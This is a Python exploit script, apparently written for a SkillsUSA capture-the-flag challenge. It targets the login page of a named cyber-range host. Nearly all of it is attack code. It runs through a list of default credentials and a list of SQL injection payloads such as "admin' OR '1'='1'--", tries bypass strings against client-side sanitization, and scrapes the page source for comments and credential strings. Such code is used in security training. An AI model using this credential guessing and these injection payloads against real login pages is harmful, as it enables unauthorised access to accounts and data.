#!/usr/bin/env python3
"""
Web Login Exploit Script for SkillsUSA Challenge
Target: https://sanitize.challenges.virginiacyberrange.net/login
"""

import requests
import sys
from urllib.parse import urljoin

class LoginExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
    
    def test_login(self, username, password):
        """Test login with given credentials"""
        login_url = urljoin(self.base_url, '/login')
        
        data = {
            'username': username,
            'password': password
        }
        
        print(f"[*] Testing login with username: '{username}', password: '{password}'")
        
        try:
            response = self.session.post(login_url, data=data, allow_redirects=False)
            print(f"[*] Status Code: {response.status_code}")
            print(f"[*] Response Headers: {dict(response.headers)}")
            print(f"[*] Response Content: {response.text[:500]}...")
            
            if 'flag' in response.text.lower() or 'ctf' in response.text.lower():
                print(f"[+] Potential flag found!")
                print(response.text)
            
            return response
            
        except Exception as e:
            print(f"[-] Error during login attempt: {e}")
            return None
    
    def bypass_sanitization_attacks(self):
        """Try various approaches to bypass client-side sanitization"""
        
        print("[*] Starting bypass attempts...")
        
        # Common default credentials
        default_creds = [
            ('admin', 'admin'),
            ('administrator', 'password'),
            ('admin', 'password'),
            ('admin', ''),
            ('', ''),
            ('guest', 'guest'),
            ('root', 'root'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('test', 'test')
        ]
        
        print("[*] Trying common default credentials...")
        for username, password in default_creds:
            response = self.test_login(username, password)
            if response and response.status_code in [200, 302]:
                if 'error' not in response.text.lower() and 'invalid' not in response.text.lower():
                    print(f"[+] Potential success with {username}:{password}")
        
        # SQL Injection attempts (server-side bypass)
        sqli_payloads = [
            "admin'--",
            "admin' OR '1'='1'--",
            "admin' OR 1=1--",
            "' OR '1'='1",
            "admin' UNION SELECT 1--",
            "admin'/*",
            "admin' OR 'a'='a",
            "') OR ('1'='1'--",
            "admin' OR 1=1#"
        ]
        
        print("[*] Trying SQL injection payloads...")
        for payload in sqli_payloads:
            response = self.test_login(payload, "password")
            if response and response.status_code in [200, 302]:
                if 'error' not in response.text.lower() and 'invalid' not in response.text.lower():
                    print(f"[+] Potential SQLi success with payload: {payload}")
        
        # Since client-side sanitization removes special chars, 
        # let's try payloads that work with alphanumeric only
        alphanumeric_bypass = [
            "admin OR 1 1",  # spaces might work
            "admin OR a a",   # letter-based condition
            "admin UNION SELECT 1",  # if spaces survive
        ]
        
        print("[*] Trying alphanumeric bypass attempts...")
        for payload in alphanumeric_bypass:
            response = self.test_login(payload, "password")
            if response and response.status_code in [200, 302]:
                if 'error' not in response.text.lower() and 'invalid' not in response.text.lower():
                    print(f"[+] Potential bypass success with: {payload}")
    
    def check_page_source(self):
        """Check the main page for any hidden information"""
        try:
            response = self.session.get(self.base_url)
            print(f"[*] Main page status: {response.status_code}")
            
            # Look for comments, hidden fields, or other clues
            content = response.text
            
            # Check for HTML comments
            import re
            comments = re.findall(r'<!--.*?-->', content, re.DOTALL)
            if comments:
                print("[*] Found HTML comments:")
                for comment in comments:
                    print(f"    {comment}")
            
            # Look for hidden inputs or JavaScript variables
            if 'hidden' in content:
                print("[*] Found 'hidden' in page source")
            
            # Check for any credentials in JavaScript
            js_creds = re.findall(r'(username|password|user|pass|login).*?["\']([^"\']+)["\']', content, re.IGNORECASE)
            if js_creds:
                print("[*] Found potential credentials in JavaScript:")
                for match in js_creds:
                    print(f"    {match}")
                    
        except Exception as e:
            print(f"[-] Error checking page source: {e}")


def main():
    target_url = "https://sanitize.challenges.virginiacyberrange.net"
    
    print(f"[*] Starting login exploit against: {target_url}")
    print(f"[*] Target login endpoint: {target_url}/login")
    
    exploit = LoginExploit(target_url)
    
    # First check the page source for clues
    exploit.check_page_source()
    
    # Then try bypass attempts
    exploit.bypass_sanitization_attacks()

if __name__ == "__main__":
    main()
